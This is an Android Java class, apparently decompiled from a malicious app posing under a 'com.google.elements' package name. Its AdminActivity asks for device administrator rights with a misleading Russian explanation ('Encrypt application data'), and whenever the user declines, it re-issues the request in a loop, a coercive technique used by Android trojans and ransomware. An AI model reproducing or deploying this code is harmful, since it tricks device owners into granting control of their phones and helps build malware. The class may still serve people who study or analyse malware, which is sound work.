package com.google.elements;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class AdminActivity extends Activity {
    ComponentName appadm;
    DevicePolicyManager dpm;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getApplicationContext();
        this.dpm = (DevicePolicyManager) getSystemService("device_policy");
        this.appadm = new ComponentName(this, DeviceAdmin.class);
        if (!this.dpm.isAdminActive(this.appadm)) {
            Utils utils = Utils.getInstance(getApplicationContext());
            utils.Edit().putBoolean("admin_service_opened", true);
            utils.Edit().commit();
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", this.appadm);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "Шифровать данные приложения");
            startActivityForResult(intent, 47);
            finish();
        }
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 47) {
            if (resultCode == -1) {
                finish();
            } else {
                getApplicationContext();
                this.dpm = (DevicePolicyManager) getSystemService("device_policy");
                this.appadm = new ComponentName(this, DeviceAdmin.class);
                if (!this.dpm.isAdminActive(this.appadm)) {
                    Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                    intent.putExtra("android.app.extra.DEVICE_ADMIN", this.appadm);
                    intent.putExtra("android.app.extra.ADD_EXPLANATION", "Шифровать данные приложения");
                    startActivityForResult(intent, 47);
                }
            }
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
